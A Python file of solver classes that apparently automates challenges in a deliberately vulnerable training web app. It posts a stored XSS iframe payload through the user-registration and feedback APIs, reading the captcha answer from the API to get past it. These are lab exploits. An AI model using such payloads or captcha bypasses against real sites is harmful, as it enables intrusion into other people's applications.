from core.base_solver import BaseSolver
from loguru import logger
import random

class ApiOnlyXssSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "persistedXssUserChallenge"

    def solve(self) -> bool:
        # Use random ID to ensure email uniqueness
        rand_suffix = random.randint(1000, 9999)
        # Payload must contain the specific iframe string
        # aligning with models/user.ts verify logic: <iframe src="javascript:alert(`xss`)">
        # Append randomness OUTSIDE the tag to preserve the substring match and ensure uniqueness
        payload_email = f'<iframe src="javascript:alert(`xss`)">{rand_suffix}'
        
        payload = {
            "email": payload_email,
            "password": "password123",
            "passwordRepeat": "password123",
            "securityQuestion": {"id": 1, "answer": "answer"}
        }
        res = self.client.post("/api/Users", json=payload)
        return res.status_code == 201

class ClientSideXssProtectionSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "persistedXssFeedbackChallenge"

    def solve(self) -> bool:
        # Payload: <iframe src="javascript:alert(`xss`)"> via Feedback
        # Note: Backticks are required by the verify check in FeedbackModel
        try:
            captcha_res = self.client.get("/rest/captcha")
            captcha_data = captcha_res.json()
            captcha_id = captcha_data.get("captchaId")
            answer = str(captcha_data.get("answer"))
            
            payload = {
                "captchaId": captcha_id,
                "captcha": answer,
                "comment": '<iframe src="javascript:alert(`xss`)">', 
                "rating": 5
            }
            res = self.client.post("/api/Feedbacks", json=payload)
            return res.status_code == 201
        except Exception as e:
            logger.error(f"Failed to solve ClientSideXssProtectionSolver: {e}")
            return False
